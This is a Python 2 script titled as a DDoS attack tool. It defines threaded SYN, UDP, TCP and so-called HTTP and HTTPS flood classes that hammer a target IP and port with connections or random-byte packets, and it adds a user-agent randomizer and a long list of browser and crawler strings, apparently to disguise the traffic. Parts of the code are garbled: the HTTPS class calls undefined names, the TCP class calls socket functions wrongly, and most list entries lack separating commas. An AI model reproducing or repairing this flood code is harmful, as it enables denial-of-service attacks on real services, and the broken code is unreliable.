
#---DDOS ATTACK BY CRACK BUI---

import random
import socket
import threading
from threading import Thread
import time
import sys
from random import randrange
from threading import Lock
import datetime
import re
import urllib2
import urllib
socket.setdefaulttimeout(1)




url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0

class synFlood(threading.Thread):
    def __init__(self, ip, port, packets):
        self.ip      = ip
        self.port    = port
        self.packets = packets
        self.syn     = socket.socket()
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                self.syn.connect((self.ip, self.port))
            except:
                pass
class httpFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.packets = packets
        self.http     = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.http.sendto(bytes,(self.ip, self.port))
            except:
                pass
class httpsFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.packets = packets
        self.https     = attcking.socket(socket.AF_INET,socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                attacking(self.ip, self.port)
                attacking(0)
                attacking(bytes,(self.ip, self.port))
            except:
                pass


#TCP FLOOD
class tcpFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.packets = packets
        self.tcp     = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                socket.connect(self.ip, self.port)
                socket.setblocking(0)
                socket.sendto(bytes,(self.ip, self.port))
            except:
                pass

#UDP FLOOD
class udpFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.packets = packets
        self.udp     = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendto(bytes,(self.ip, self.port))
            except:
                pass

def getUserAgent():
    platform = random.choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os  = random.choice(['68K', 'PPC'])
    elif platform == 'Windows':
        os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE'])
    elif platform == 'X11':
        os  = random.choice(['Linux i686', 'Linux x86_64'])
    browser = random.choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(random.randint(500, 599))
        version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(random.randint(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(random.randint(2000, currentYear))
        month = random.randint(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = random.randint(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(random.randint(1, 21)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(random.randint(1, 10)) + '.0'
        engine = str(random.randint(1, 5)) + '.0'
        option = random.choice([True, False])
        if option == True:
            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

userAgents = [
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)"
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)"
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1"
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)"
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57"
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413"
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0"
        "Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)"
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125"
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413"
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)"
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
        "Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)"
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7"
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
        "Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)"
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)"
        "Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)"
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)"
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007"
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)"
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)"
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)"
        "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0"
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16"
        "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)"
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13"
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)"
        "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)"
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8"
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7"
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1"
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)"
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)"
        "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)"
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)"
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)"
        "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)"
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)"
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1"
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)"
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57"
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413"
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0"
        "Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)"
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125"
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413"
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)"
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
        "Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)"
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7"
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
        "Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)"
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)"
      "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
      "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)"
      "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007"
      "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
      "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
      "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"
      "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0"
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0"
      "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0"
      "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0"
      "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3"
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0"
      "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0"
      "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))"
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)"
      "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
      "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00"
      "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14"
      "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14"
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"
      "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02"
      "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00"
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00"
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"
      "HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)"
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70)",
      "Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+",
      "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
      "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.115 Mobile Safari/534.11+",
      "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
      "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
      "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5",
      "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
      "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
      "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
      "facebookexternalhit/1.0 (+http://www.facebook.com/externalhit_uatext.php)"
      "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
      "Mozilla/5.0 (compatible; SMTBot/1.0; +http://www.similartech.com/smtbot)"
      "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
      "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
      "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
      "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )"
      "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; HaosouSpider; http://www.haosou.com/help/help_3_2.html)",
      "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)",
      "Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)"
      "Mozilla/5.0 (compatible; SEOdiver/1.0; +http://www.seodiver.com/bot)"
      "Mozilla/5.0 (compatible; SEOkicks-Robot; +http://www.seokicks.de/robot.html)"
      "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
      "Mozilla/5.0 (compatible; Mp3Bot/0.7; +http://mp3realm.org/mp3bot/)"
      "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
      "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
      "Mozilla/5.0 (compatible; SecretSerachEngineLabs.com-SBSearch/0.9; http://www.secretsearchenginelabs.com/secret-web-crawler.php)",
      "Googlebot-Image/1.0 Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search",
      "Mozilla/5.0 (Linux;u;Android 2.3.7;zh-cn;) AppleWebKit/533.1 (KHTML,like Gecko) Version/4.0 Mobile Safari/533.1 (compatible; +http://www.baidu.com/search/spider.html)",
      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
      "Mozilla/5.0 (compatible; Sosoimagespider/2.0; +http://help.soso.com/soso-image-spider.htm)"
      "Sosospider+(+http://help.soso.com/webspider.htm)"
